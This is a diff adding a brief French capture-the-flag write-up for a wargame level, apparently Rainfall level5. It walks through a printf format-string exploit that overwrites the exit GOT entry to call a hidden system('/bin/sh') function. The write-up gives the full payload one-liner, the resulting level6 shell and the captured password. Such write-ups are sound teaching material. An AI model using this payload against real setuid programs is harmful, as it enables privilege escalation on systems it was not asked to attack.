@@ -1,0 +1,36 @@
+Connextion au level5 -> Bit NX desactive
+Chech du home et des permissions du binaire -> Bit SUID level6
+Exection du binaire -> attente d'ecriture sur l'entree standard et reaffichage de la chaine sur la sortie (echo like)
+
+"""
+level5@Rainfaill:~$ ./level5
+abc
+abc
+"""
+
+Reecriture du code source en utilisant objdump -d et gdb avec peda
+
+Fonction "o" appelant "system(/bin/sh)" mais pas appele dans les fonctions precedentes
+
+printf exploitable de la meme maniere qu'au 2 levels precedents
+
+Recherche sur google -> "execute function with printf exploit"
+-> https://axcheron.github.io/exploit-101-format-strings/
+
+objdump -R ./level5
+-> 08049838 R_386_JUMP_SLOT   exit
+
+objdump -t ./level5 | grep o
+-> 080484a4 g     F .text	0000001e              o
+
+Il faut alors ecraser l'adresse pointer par exit par celle de la fonction o afin qu'elle soit executer.
+
+0804 in dec = 2052 - 8 = 2044
+84a4 in dec = 33956 - 2052 = 31904
+
+python -c 'print "\x3A\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044x" + "%4$hn" + "%31904x" + "%5$hn"' > /tmp/z && cat /tmp/z - | ./level5
+id
+uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
+cd /home/user/level6
+cat .pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
